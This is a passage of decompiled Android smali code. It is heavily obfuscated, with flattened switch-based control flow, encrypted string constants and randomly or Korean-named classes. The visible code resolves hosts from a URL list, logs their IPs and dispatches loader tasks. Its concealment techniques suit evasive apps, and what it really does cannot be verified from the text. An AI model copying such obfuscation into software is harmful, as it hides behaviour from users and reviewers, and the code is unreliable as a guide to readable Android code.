    const-string v0, "\u06ec\u06e1\u06d7\u06e0\u06d7\u06d6\u06d8\u06e6\u06e6\u06d9\u06d6\u06e7\u06e6\u06d8\u06e1\u06d9\u06e7\u06d7\u06eb\u06d8\u06d8\u06e1\u06d7\u06e1\u06d8\u06df\u06e7\u06e5\u06d8\u06e4\u06d6\u06e6\u06ec\u06ec\u06e8\u06d8\u06d9\u06e7\u06e5\u06e2\u06e8\u06d6\u06d8\u06d6\u06d8\u06e5\u06e0\u06e6\u06e1\u06d8\u06d9\u06eb\u06eb\u06d8\u06e6\u06ec"

    goto :goto_c

    :sswitch_25
    const v5, 0x3bfa605

    const-string v0, "\u06e6\u06e4\u06da\u06e1\u06ec\u06d8\u06d8\u06e0\u06e5\u06e1\u06d8\u06ec\u06e1\u06e1\u06e7\u06dc\u06df\u06d9\u06e1\u06e6\u06eb\u06e0\u06d6\u06d8\u06df\u06e5\u06eb\u06df\u06e2\u06db\u06d6\u06df\u06d8"

    :goto_10
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_b

    goto :goto_10

    :sswitch_26
    const-string v0, "\u06d9\u06e0\u06e0\u06e8\u06e6\u06e1\u06eb\u06d8\u06d8\u06d8\u06e2\u06db\u06db\u06e4\u06eb\u06ec\u06d6\u06e7\u06dc\u06d7\u06da\u06e6\u06d8\u06e2\u06df\u06da\u06d8\u06eb\u06df\u06e6\u06db\u06d7\u06e6\u06dc\u06ec\u06d7\u06e6"

    goto :goto_10

    :cond_4
    const-string v0, "\u06e8\u06d6\u06e6\u06e0\u06da\u06e1\u06eb\u06d7\u06d6\u06d8\u06e1\u06e6\u06e7\u06d8\u06e0\u06e1\u06d8\u06e5\u06d7\u06e4\u06e2\u06d8\u06eb\u06e0\u06e0\u06e1\u06d8\u06e5\u06d7\u06e5\u06d8\u06ec\u06db\u06dc\u06d8\u06da\u06e0\u06e4\u06d8\u06d8\u06e4"

    goto :goto_10

    :sswitch_27
    if-eqz v2, :cond_4

    const-string v0, "\u06ec\u06d8\u06e7\u06e8\u06dc\u06dc\u06db\u06ec\u06df\u06e6\u06d8\u06d8\u06e4\u06d8\u06e1\u06d8\u06e4\u06d9\u06e2\u06da\u06e4\u06e6\u06d8\u06e6\u06d6\u06e0\u06eb\u06e8\u06ec\u06dc\u06e5\u06d9\u06db\u06dc\u06d8\u06d8\u06e7\u06df\u06d6\u06d8\u06d9\u06da\u06e0\u06e7\u06db\u06e8\u06d8\u06d7\u06d8\u06d8\u06e7\u06e5\u06e7\u06d8"

    goto :goto_10

    :sswitch_28
    const-string v0, "\u06e4\u06d6\u06e7\u06d8\u06db\u06e6\u06e5\u06d8\u06d9\u06e4\u06d7\u06d6\u06dc\u06e7\u06e5\u06e7\u06d8\u06d8\u06df\u06d6\u06e6\u06d8\u06e0\u06e0\u06dc\u06e8\u06e5\u06d8\u06eb\u06d9\u06d8\u06e2\u06e4\u06e5\u06d8\u06e5\u06e2\u06e6\u06d8\u06d9\u06e0\u06e2\u06e5\u06da\u06d7\u06e0\u06ec\u06db"

    goto :goto_c

    :sswitch_29
    const-string v0, "\u06e8\u06db\u06e1\u06e8\u06e4\u06eb\u06e2\u06db\u06d9\u06ec\u06d8\u06e2\u06d9\u06d6\u06d8\u06d6\u06dc\u06e1\u06e4\u06dc\u06d7\u06e8\u06e7\u06ec\u06e2\u06db\u06e2\u06e2\u06e6\u06d6\u06db\u06e5\u06d9\u06e6\u06d9"

    goto :goto_c

    :sswitch_2a
    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    const v3, 0x7701e9bb

    const-string v2, "\u06df\u06d7\u06e8\u06eb\u06e1\u06e5\u06d8\u06dc\u06e1\u06e4\u06db\u06e2\u06e6\u06d8\u06eb\u06db\u06e6\u06d8\u06d7\u06ec\u06eb\u06e6\u06d7\u06d6\u06d7\u06e8\u06e2\u06e4\u06e7\u06ec\u06e6\u06d8\u06dc\u06df\u06d8\u06d9\u06e0\u06d8\u06d8"

    :goto_11
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v3

    sparse-switch v5, :sswitch_data_c

    goto :goto_11

    :sswitch_2b
    const-string v2, "mg==\n"

    const-string v3, "sMt3nKx19oM=\n"

    invoke-static {v2, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {}, LKvrUY/RiiGL/Utils;->generateRandomString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    :goto_12
    const-string v2, ""

    :try_start_3
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->getHost()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/net/InetAddress;->getAllByName(Ljava/lang/String;)[Ljava/net/InetAddress;

    move-result-object v5

    const v6, 0x51eeea4e

    const-string v0, "\u06e4\u06e8\u06e2\u06d8\u06db\u06e0\u06ec\u06e4\u06e4\u06ec\u06da\u06e6\u06e4\u06ec\u06d8\u06e5\u06df\u06e8\u06e1\u06d9\u06d6\u06d7\u06e1\u06d8\u06e8\u06d9\u06d6\u06d9\u06df\u06df"

    :goto_13
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v6

    sparse-switch v9, :sswitch_data_d

    goto :goto_13

    :sswitch_2c
    const v9, 0x477a01ea

    const-string v0, "\u06e0\u06ec\u06e1\u06d8\u06eb\u06e5\u06ec\u06e1\u06e6\u06e6\u06d8\u06e7\u06e1\u06e6\u06e5\u06d9\u06e2\u06d9\u06d8\u06e7\u06d8\u06d6\u06db\u06d8\u06d8\u06e8\u06df\u06e5\u06d8\u06ec\u06e6\u06e1\u06db\u06e5\u06e4\u06e2\u06d7\u06e4\u06e8\u06e6\u06d6\u06d8\u06db\u06e8\u06dc\u06e2\u06d6\u06e8\u06e4\u06e4\u06e2\u06d9\u06e4\u06d8\u06d8\u06d7\u06dc\u06e5\u06da\u06ec\u06e6\u06d8"

    :goto_14
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_e

    goto :goto_14

    :sswitch_2d
    const-string v0, "\u06e8\u06db\u06d8\u06ec\u06d8\u06e7\u06e0\u06db\u06e8\u06e4\u06ec\u06da\u06e2\u06d7\u06dc\u06d6\u06d7\u06d9\u06e8\u06d8\u06d9\u06e6\u06eb\u06d8\u06d9\u06e1\u06d8\u06eb\u06da\u06dc\u06d8\u06dc\u06e7\u06da\u06da\u06da\u06d7\u06df\u06d8\u06d7\u06e8\u06e1\u06d8\u06e6\u06d8\u06ec\u06e1\u06e1\u06e4\u06d8\u06ec\u06eb\u06da\u06e6\u06db"
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_13

    :sswitch_2e
    const-string v2, "\u06d8\u06ec\u06e2\u06e0\u06e4\u06e5\u06db\u06e7\u06d9\u06d9\u06e5\u06e5\u06d8\u06d7\u06d7\u06e5\u06d8\u06ec\u06d7\u06db\u06e0\u06dc\u06d8\u06d8\u06e2\u06e7\u06db\u06e4\u06d6\u06d8\u06e7\u06db\u06ec\u06e8\u06e4\u06d8\u06d8\u06e2\u06e6\u06d9"

    goto :goto_11

    :sswitch_2f
    const v5, 0x763c0ade

    const-string v2, "\u06e6\u06e4\u06e1\u06e0\u06e6\u06e1\u06d7\u06e7\u06d9\u06e2\u06db\u06e6\u06e7\u06d9\u06e7\u06db\u06dc\u06d8\u06d8\u06dc\u06e0\u06df\u06db\u06ec\u06e1\u06d6\u06e0\u06e6\u06ec\u06d6\u06d8"

    :goto_15
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_f

    goto :goto_15

    :sswitch_30
    const-string v2, "\u06da\u06d6\u06d8\u06db\u06e0\u06d8\u06d8\u06da\u06e2\u06e1\u06e6\u06d9\u06e6\u06d9\u06d8\u06dc\u06d8\u06d8\u06e0\u06e4\u06e5\u06e1\u06e4\u06e0\u06eb\u06ec\u06d7\u06e8\u06df\u06e5\u06d7\u06eb\u06e7\u06d9\u06e8\u06d8\u06d8\u06d9\u06d6\u06e1\u06e1\u06e5\u06d8\u06d7\u06dc\u06e2\u06e1\u06eb\u06e8\u06d8\u06d9\u06eb"

    goto :goto_11

    :cond_5
    const-string v2, "\u06da\u06d9\u06e1\u06db\u06e0\u06d6\u06d8\u06d8\u06e6\u06ec\u06ec\u06db\u06e2\u06e4\u06e0\u06e7\u06d8\u06dc\u06d8\u06d7\u06e1\u06e8\u06d8\u06ec\u06df\u06db\u06d9\u06ec\u06e0\u06d7\u06eb\u06e6\u06d8\u06db\u06d9\u06d7\u06e7\u06dc\u06d6\u06ec\u06e2\u06d8\u06da\u06e6\u06e6\u06df\u06d6\u06dc\u06d8\u06df\u06e7\u06eb\u06e6\u06e8\u06d6\u06ec"

    goto :goto_15

    :sswitch_31
    const-string v2, "Yg==\n"

    const-string v6, "SKFGWRcmlTo=\n"

    invoke-static {v2, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_5

    const-string v2, "\u06d7\u06d8\u06dc\u06dc\u06d7\u06d7\u06d6\u06da\u06e1\u06d9\u06d8\u06ec\u06e6\u06d6\u06d8\u06d8\u06e0\u06d8\u06e0\u06dc\u06df\u06d6\u06d9\u06dc\u06e2\u06eb\u06e7\u06d9\u06e2\u06d8\u06d8\u06df\u06d7\u06db\u06ec\u06e2\u06e8\u06e5\u06db\u06e8\u06eb\u06e8\u06e7\u06d8\u06d6\u06e2\u06e1\u06d8\u06e0\u06e6\u06e6"

    goto :goto_15

    :sswitch_32
    const-string v2, "\u06e8\u06e4\u06e6\u06e0\u06da\u06e5\u06e2\u06eb\u06e1\u06da\u06d8\u06d8\u06e7\u06d8\u06da\u06db\u06e7\u06e2\u06e2\u06d6\u06d8\u06d8\u06d9\u06ec\u06e5\u06e4\u06d6\u06d6\u06d8\u06e8\u06d9\u06eb\u06da\u06dc\u06d6\u06e8\u06d8\u06e8\u06d8\u06da\u06da\u06e7\u06e6\u06e2\u06db\u06e1\u06e1\u06e2\u06e2\u06dc\u06e6\u06d8\u06d7\u06eb\u06e5\u06db\u06df"

    goto :goto_15

    :sswitch_33
    const-string v2, "\u06e6\u06df\u06e8\u06dc\u06e8\u06e1\u06e5\u06dc\u06ec\u06dc\u06db\u06da\u06ec\u06e2\u06eb\u06e4\u06d8\u06eb\u06e4\u06e0\u06e2\u06dc\u06e7\u06d8\u06e0\u06d6\u06da\u06d7\u06e6\u06e4\u06df\u06d9\u06d6\u06eb\u06e0\u06ec\u06e0\u06e7\u06ec\u06df\u06dc\u06d6\u06d8\u06e7\u06e8\u06ec\u06e2\u06e7\u06eb"

    goto :goto_11

    :sswitch_34
    :try_start_4
    const-string v0, "\u06d8\u06dc\u06d7\u06e7\u06ec\u06d6\u06d8\u06ec\u06da\u06d9\u06e1\u06e7\u06e5\u06d8\u06d8\u06e6\u06dc\u06d8\u06ec\u06e8\u06e7\u06d8\u06e2\u06d7\u06df\u06d8\u06ec\u06e8\u06e1\u06d8\u06d8\u06eb\u06df\u06e6\u06eb\u06d7\u06e8\u06db\u06e4\u06dc\u06e2\u06dc\u06e4\u06da\u06e1\u06d8\u06d9\u06d6\u06e5\u06d8\u06dc\u06da\u06e7"

    goto :goto_13

    :cond_6
    const-string v0, "\u06e6\u06d6\u06e8\u06eb\u06e4\u06e8\u06ec\u06e8\u06ec\u06ec\u06da\u06d6\u06d8\u06e5\u06da\u06e1\u06e8\u06eb\u06e4\u06e0\u06d8\u06e1\u06e5\u06dc\u06e5\u06d8\u06e6\u06e7\u06e6\u06e1\u06ec\u06d6\u06eb\u06d7\u06e8\u06e2\u06eb\u06d6\u06da\u06d7\u06df\u06e0\u06dc\u06e5\u06d8"

    goto :goto_14

    :sswitch_35
    array-length v0, v5

    if-lez v0, :cond_6

    const-string v0, "\u06d9\u06e4\u06d8\u06d8\u06e5\u06eb\u06db\u06e8\u06e2\u06d8\u06d9\u06df\u06e0\u06e4\u06e4\u06dc\u06d6\u06d8\u06ec\u06d7\u06e5\u06d8\u06e5\u06e7\u06df\u06e7\u06ec\u06d6\u06d8\u06e7\u06e4\u06da\u06e4\u06e6\u06eb\u06e1\u06e6\u06dc\u06e7\u06d8\u06e8\u06d6\u06db\u06e1"

    goto :goto_14

    :sswitch_36
    const-string v0, "\u06da\u06e5\u06dc\u06e7\u06ec\u06d7\u06df\u06da\u06ec\u06ec\u06e6\u06e5\u06db\u06e2\u06e0\u06da\u06db\u06e0\u06db\u06da\u06d8\u06e2\u06e0\u06da\u06e5\u06d8\u06d9\u06e7\u06e5\u06d8\u06d9\u06ec\u06e5\u06d6\u06d9\u06e1\u06eb\u06e7\u06e2\u06d8\u06ec\u06e2\u06e8\u06d8\u06e2\u06d9\u06e8\u06df\u06d8\u06e5\u06d7\u06dc\u06e0"

    goto :goto_14

    :sswitch_37
    const-string v0, "\u06df\u06d8\u06e0\u06e0\u06df\u06e5\u06d8\u06dc\u06e1\u06e1\u06e7\u06dc\u06eb\u06d6\u06d6\u06d6\u06da\u06d8\u06db\u06e1\u06e8\u06e1\u06d8\u06e2\u06e0\u06d7\u06e5\u06d6\u06df\u06e7\u06d9\u06dc\u06d7\u06e0\u06e7\u06e7\u06e7\u06dc\u06d8"

    goto :goto_13

    :sswitch_38
    const/4 v0, 0x0

    aget-object v0, v5, v0

    invoke-virtual {v0}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "DTanPbzf+b65bbt54d4tubpqoEA=\n"

    const-string v6, "6oUc2gdAvfA=\n"

    invoke-static {v5, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v5, "6F+hHA==\n"

    const-string v6, "gTHHc2cHdGw=\n"

    invoke-static {v5, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :goto_16
    :sswitch_39
    new-instance v0, Landroidx/base/불러오기;

    iget-boolean v5, p0, Landroidx/base/패배;->b:Z

    iget-object v6, p0, Landroidx/base/패배;->e:Ljava/lang/Object;

    check-cast v6, [Ljava/lang/String;

    invoke-direct/range {v0 .. v6}, Landroidx/base/불러오기;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/util/concurrent/CountDownLatch;Z[Ljava/lang/String;)V

    iget-object v1, p0, Landroidx/base/패배;->f:Ljava/lang/Object;

    check-cast v1, Ljava/util/concurrent/ExecutorService;

    invoke-interface {v1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-virtual {v7, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_b

    :catch_2
    move-exception v0

    const-string v5, "ogQ4dEJIxgQWXyQwH0kSr+EGaydcOD7Q\n"

    const-string v6, "RbeDk/nXgko=\n"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v5, v6, v9, v0}, Landroidx/base/남자;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "q6daUfaAjw==\n"

    const-string v6, "3MYoP5/u6Ic=\n"

    invoke-static {v5, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_16

    :sswitch_3a
    :try_start_5
    const-string v0, "\u06d7\u06e1\u06e1\u06d8\u06e5\u06e4\u06e0\u06dc\u06eb\u06d9\u06eb\u06e6\u06d9\u06e6\u06db\u06e2\u06d7\u06e0\u06e4\u06eb\u06ec\u06e8\u06d8\u06e7\u06e7\u06eb\u06e1\u06df\u06eb\u06e7\u06e6\u06df\u06d6\u06df\u06e1\u06d7\u06df\u06dc\u06d8\u06e7\u06dc\u06e0\u06e8\u06d7\u06e1\u06d8\u06e8\u06da\u06e2\u06d6\u06d8\u06d8\u06d8"

    goto/16 :goto_e

    :sswitch_3b
    const v3, -0x68d0d7d3

    const-string v0, "\u06ec\u06ec\u06e1\u06dc\u06df\u06dc\u06d8\u06e7\u06e5\u06e5\u06e0\u06ec\u06e8\u06db\u06db\u06e1\u06e8\u06d9\u06e5\u06d8\u06e7\u06d9\u06d8\u06d8\u06dc\u06e2\u06e0\u06e6\u06e4\u06e0\u06e2\u06e1\u06d7\u06df\u06e1\u06e4\u06df\u06e2\u06e5\u06d8"

    :goto_17
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_10

    goto :goto_17

    :sswitch_3c
    const-string v0, "\u06e5\u06dc\u06d6\u06d8\u06d6\u06da\u06e0\u06e0\u06ec\u06d7\u06db\u06ec\u06db\u06d9\u06eb\u06e0\u06eb\u06da\u06da\u06e5\u06e8\u06e8\u06ec\u06d7\u06dc\u06e8\u06e6\u06d8\u06e1\u06ec\u06e1\u06d8\u06da\u06d9\u06e6\u06da\u06e7\u06d7"

    goto/16 :goto_e

    :cond_7
    const-string v0, "\u06e8\u06e1\u06e5\u06d8\u06da\u06df\u06e1\u06d7\u06e8\u06df\u06df\u06e6\u06d8\u06e8\u06e8\u06e6\u06d9\u06d6\u06d7\u06e5\u06d7\u06e6\u06e7\u06d9\u06e6\u06ec\u06da\u06d6\u06df\u06eb\u06db\u06e6\u06e1\u06e6\u06e1\u06d7\u06e5\u06d7\u06d7\u06d8\u06d9\u06e8\u06df\u06db\u06d9\u06d8\u06d8\u06ec\u06d6\u06e1"

    goto :goto_17

    :sswitch_3d
    invoke-static {v7}, Lj$/util/Collection$-EL;->stream(Ljava/util/Collection;)Lj$/util/stream/Stream;

    move-result-object v0

    new-instance v4, Ljava/lang/Object;

    invoke-direct {v4}, Ljava/lang/Object;-><init>()V

    invoke-interface {v0, v4}, Lj$/util/stream/Stream;->anyMatch(Ljava/util/function/Predicate;)Z

    move-result v0

    if-eqz v0, :cond_7

    const-string v0, "\u06d7\u06e5\u06e5\u06d8\u06e4\u06e8\u06d6\u06d9\u06dc\u06e7\u06d8\u06e5\u06d7\u06e2\u06db\u06d8\u06eb\u06ec\u06e2\u06d8\u06dc\u06d8\u06d8\u06d8\u06ec\u06da\u06eb\u06e2\u06e2\u06e7\u06da\u06e0\u06e1\u06d8\u06e7\u06e7\u06da\u06ec\u06da\u06d8\u06d8\u06ec\u06e7\u06e7\u06e1\u06d8"

    goto :goto_17

    :sswitch_3e
    const-string v0, "\u06d9\u06d6\u06e1\u06d8\u06d9\u06df\u06dc\u06d8\u06e1\u06d8\u06dc\u06d8\u06e7\u06dc\u06e6\u06d8\u06e7\u06ec\u06d6\u06e5\u06da\u06e8\u06d8\u06ec\u06df\u06d6\u06d8\u06d7\u06e2\u06e8\u06d8\u06d7\u06ec\u06e2\u06e1\u06e6\u06e5\u06e6\u06e0\u06e4\u06dc\u06d6\u06e6\u06e5\u06d7\u06d7\u06e7\u06e5\u06d9"
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_17

    :sswitch_3f
    const-string v0, "\u06e0\u06da\u06e5\u06d8\u06dc\u06e1\u06d6\u06db\u06df\u06e4\u06e7\u06ec\u06db\u06d9\u06e1\u06d8\u06e4\u06da\u06e5\u06df\u06d9\u06e6\u06d8\u06e1\u06d8\u06e5\u06d8\u06e2\u06e6\u06ec\u06e6\u06e0\u06d7\u06e2\u06e6\u06e1\u06e8\u06eb\u06e2\u06ec\u06ec\u06e2\u06dc\u06e6\u06dc\u06d8"

    goto/16 :goto_e

    :sswitch_40
    const-string v0, "\u06e5\u06e5\u06e7\u06d8\u06e1\u06d9\u06eb\u06eb\u06e8\u06e2\u06e0\u06ec\u06dc\u06d8\u06e2\u06e4\u06e0\u06e6\u06df\u06d6\u06d8\u06d6\u06dc\u06d6\u06e1\u06e6\u06ec\u06eb\u06ec\u06df\u06d8\u06e7\u06db\u06e2\u06e4\u06e1\u06d8\u06e5\u06d7\u06eb\u06eb\u06eb\u06d8\u06d8\u06d6\u06d8\u06d8\u06d8\u06e6\u06db\u06dc\u06e0\u06d8\u06e1"

    goto/16 :goto_f

    :sswitch_41
    const v4, 0x4963055f

    const-string v0, "\u06da\u06d6\u06d7\u06ec\u06ec\u06db\u06e7\u06e2\u06db\u06e4\u06e7\u06db\u06e7\u06da\u06e4\u06e7\u06e6\u06ec\u06db\u06e6\u06e7\u06d8\u06db\u06eb\u06e8\u06d8\u06dc\u06e5\u06e0\u06dc\u06d9\u06df\u06e0\u06e1\u06e2\u06d8\u06ec\u06da\u06eb\u06e4\u06d6\u06d8\u06ec\u06e4\u06e0"

    :goto_18
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_11

    goto :goto_18

    :sswitch_42
    const-string v0, "\u06e6\u06da\u06e0\u06d6\u06e0\u06e2\u06db\u06da\u06e8\u06df\u06df\u06dc\u06d8\u06d6\u06e7\u06eb\u06e8\u06e7\u06dc\u06d8\u06da\u06d7\u06e8\u06d8\u06d9\u06da\u06da\u06e4\u06d8\u06dc\u06ec\u06e5\u06e4\u06e1\u06d9\u06d9\u06e1\u06e5\u06db\u06e0\u06dc\u06dc\u06db\u06db\u06e5\u06da\u06e4\u06e5\u06e6\u06da\u06d6\u06d8\u06da\u06e2\u06e5"

    goto/16 :goto_f

    :cond_8
    const-string v0, "\u06db\u06da\u06e2\u06d9\u06e2\u06e6\u06d8\u06dc\u06d9\u06e4\u06e5\u06e1\u06dc\u06d8\u06e0\u06db\u06d7\u06ec\u06d9\u06e5\u06d8\u06e4\u06ec\u06eb\u06e5\u06d6\u06e6\u06e8\u06db\u06ec\u06e6\u06eb\u06e0\u06da\u06d8\u06d8\u06e6\u06d8\u06d6\u06d8\u06e0\u06e6\u06e0\u06e0\u06df\u06e6\u06d7\u06d8\u06e0\u06d9\u06e6\u06dc\u06e4\u06e7\u06d6\u06e7\u06e5\u06e5"

    goto :goto_18

    :sswitch_43
    invoke-static {}, Landroidx/base/복원;->isDebug()Z

    move-result v0

    if-eqz v0, :cond_8

    const-string v0, "\u06dc\u06db\u06d8\u06d8\u06eb\u06eb\u06e1\u06e2\u06e6\u06e1\u06d8\u06ec\u06e6\u06d8\u06dc\u06dc\u06dc\u06d8\u06dc\u06ec\u06e8\u06eb\u06df\u06d8\u06e7\u06d6\u06e5\u06d8\u06e4\u06e1\u06d8\u06dc\u06e0\u06e2\u06e5\u06e4\u06db\u06e0\u06e4\u06e7\u06da\u06d6\u06d8\u06db\u06e2\u06e1\u06d8\u06e7\u06eb\u06d8\u06e1\u06e5\u06e8"

    goto :goto_18

    :sswitch_44
    const-string v0, "\u06e7\u06d8\u06ec\u06da\u06e8\u06eb\u06e0\u06ec\u06d6\u06d7\u06ec\u06e1\u06d9\u06eb\u06e6\u06d8\u06eb\u06da\u06dc\u06da\u06d6\u06e6\u06d6\u06d7\u06e7\u06e0\u06e6\u06d9\u06db\u06eb\u06d8\u06e7\u06e1\u06d7\u06da\u06e2\u06dc\u06d6\u06db\u06e7\u06eb\u06d7\u06d9\u06e7\u06da\u06dc\u06e1\u06e7\u06dc\u06e5\u06eb\u06e8\u06d8\u06dc\u06df\u06e6"

    goto :goto_18

    :sswitch_45
    const-string v0, "\u06d8\u06e2\u06dc\u06dc\u06db\u06dc\u06d8\u06d8\u06e8\u06e5\u06dc\u06db\u06d6\u06e1\u06d8\u06e2\u06d6\u06db\u06dc\u06d8\u06e2\u06e0\u06dc\u06d8\u06dc\u06e4\u06e4\u06e0\u06d7\u06d7\u06da\u06e8\u06d8\u06df\u06df\u06dc\u06d8\u06e5\u06d6\u06d9\u06e7\u06da\u06e8\u06dc\u06e4\u06df\u06e4\u06e6\u06eb\u06e8\u06d6\u06e1"

    goto/16 :goto_f

    :pswitch_1
    iget-object v0, p0, Landroidx/base/패배;->d:Ljava/lang/Object;

    check-cast v0, Ljava/lang/String;

    iget-boolean v4, p0, Landroidx/base/패배;->b:Z

    iget-object v1, p0, Landroidx/base/패배;->c:Ljava/lang/Object;

    check-cast v1, LKvrUY/RiiGL/JsInterface;

    iget-object v2, p0, Landroidx/base/패배;->e:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    iget-object v3, p0, Landroidx/base/패배;->f:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    invoke-static {v1, v0, v4, v2, v3}, LKvrUY/RiiGL/JsInterface;->o(LKvrUY/RiiGL/JsInterface;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_8

    :catch_3
    move-exception v0

    goto/16 :goto_d

    :sswitch_46
    move-object v3, v0

    goto/16 :goto_12

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :sswitch_data_0
    .sparse-switch
        -0x6ad8d096 -> :sswitch_3
        -0x2e463f2f -> :sswitch_1f
        -0x118859e1 -> :sswitch_0
        0x6b7fa767 -> :sswitch_7
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x32c6a33d -> :sswitch_1
        -0xd4d842a -> :sswitch_d
        0x19d387c9 -> :sswitch_1f
        0x370f3e62 -> :sswitch_9
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x36aeb781 -> :sswitch_6
        -0x1ed8dcae -> :sswitch_2
        0x45f8855a -> :sswitch_5
        0x7af59a74 -> :sswitch_4
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x65f5d233 -> :sswitch_c
        -0x41f16f63 -> :sswitch_a
        -0x17c4cb46 -> :sswitch_8
        0x1ef5b6b3 -> :sswitch_b
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x70575b68 -> :sswitch_17
        0x432209ac -> :sswitch_10
        0x6c4a155c -> :sswitch_e
        0x755ea910 -> :sswitch_14
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x79562bcf -> :sswitch_12
        -0x6e5db236 -> :sswitch_f
        0xa8fab26 -> :sswitch_13
        0x75d7eb3a -> :sswitch_11
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        -0x51dcfecf -> :sswitch_1e
        -0x25bb7854 -> :sswitch_15
        0x7012753a -> :sswitch_19
        0x7d381ab3 -> :sswitch_1d
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        -0x51aea721 -> :sswitch_18
        0x31fd9af5 -> :sswitch_1c
        0x34795e40 -> :sswitch_1b
        0x6d51d011 -> :sswitch_1a
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x5b9daae0 -> :sswitch_2a
        -0x29b8adac -> :sswitch_20
        -0x1bd6e2fa -> :sswitch_25
        0x7edb4a2e -> :sswitch_29
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x4ce7ad7e -> :sswitch_21
        -0x3b61e62e -> :sswitch_16
        -0x880b07c -> :sswitch_3f
        0x13b30565 -> :sswitch_3b
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0x1e096314 -> :sswitch_23
        0x17ef514 -> :sswitch_22
        0x1e1febd3 -> :sswitch_41
        0x7f0db907 -> :sswitch_45
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        -0x61f539ad -> :sswitch_26
        -0x52ea334f -> :sswitch_24
        -0x8672b93 -> :sswitch_27
        0x636f8cfd -> :sswitch_28
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        0x242a1919 -> :sswitch_2f
        0x366bae2a -> :sswitch_46
        0x4ec66865 -> :sswitch_2b
        0x7e386616 -> :sswitch_33
    .end sparse-switch

    :sswitch_data_d
    .sparse-switch
        -0x6ca82922 -> :sswitch_37
        -0x2eb7676d -> :sswitch_38
        0x6bbce63 -> :sswitch_2c
        0x4069fa51 -> :sswitch_39
    .end sparse-switch

    :sswitch_data_e
    .sparse-switch
        -0x6fc9c5f1 -> :sswitch_34
        -0x27a671d8 -> :sswitch_36
        0x4086f8ae -> :sswitch_2d
